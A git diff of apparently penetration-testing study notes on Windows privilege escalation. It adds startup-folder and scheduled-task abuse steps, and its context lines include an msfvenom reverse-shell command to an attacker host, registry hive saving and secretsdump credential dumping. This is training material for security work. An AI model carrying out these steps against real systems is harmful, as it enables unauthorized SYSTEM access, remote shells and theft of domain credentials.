@@ -878,6 +878,10 @@ C:\Temp> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startu
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/12f85b86-6240-4ec0-add1-168afce6b7e7)
 
+you also can use accesschk to check the permission
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c6ed4ab5-2b46-47ab-8472-375e8387a561)
+
 
 2. From the output notice that the `"BUILTIN\Users"` group has full access `'(F)'` to the directory.
 
@@ -900,9 +904,10 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53  -f exe -o 
 
 1. Place `y.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`.
 
+2. logout and login again
 ### Kali VM
 
-1. Wait for a reverse shell on your kali machine.
+1. Wait for a reverse shell on your kali machine. [Reference](https://3alam.pro/redvirus/articles/privilege-escalation-startup-programs)
 
 # <span style="color:lightblue">Port Forwarding</span>
 
@@ -1489,6 +1494,28 @@ PS C:\Temp> reg save hklm\system c:\temp\system.hive
 ```console
 $ secretsdump.py -ntds ntds.dit -system system.hive LOCAL | tee hash-dump
 ```
+
+# <span style="color:lightblue">Scheduled Tasks</span>
+Windows has the ability to schedule tasks, meaning it is possible to execute a command or script on the system at a specific time or at a simultaneous time, for example, every five minutes, etc. you need to manually search for these files.
+## <span style="color:lightgreen">Detection</span>
+after manual enumeration. I found a file called CleanUp.ps1 in C:\DevTools. check the content of the file 
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7064bea2-0762-411e-a68a-046af6d8f932)
+
+there is a comment that says script will clean up all your old dev logs every minute and this file will run with SYSTEM privilege which is the highest privilege
+
+## <span style="color:lightgreen">Exploitation</span>
+1. Before exploitation check if you can write inside the file using accesschk
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/0610c463-aa5b-4e5a-8d95-4062cd9e72e9)
+
+we have the write permission so we will contact our malicious file within the file
+
+2. use msfvenom to generate a file
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/8c895b02-46dd-4446-a0cd-36a1e86abcad)
+
+3. run nc to get a shell
 
 # <span style="color:lightblue">Abusing GPO permissions</span>
 
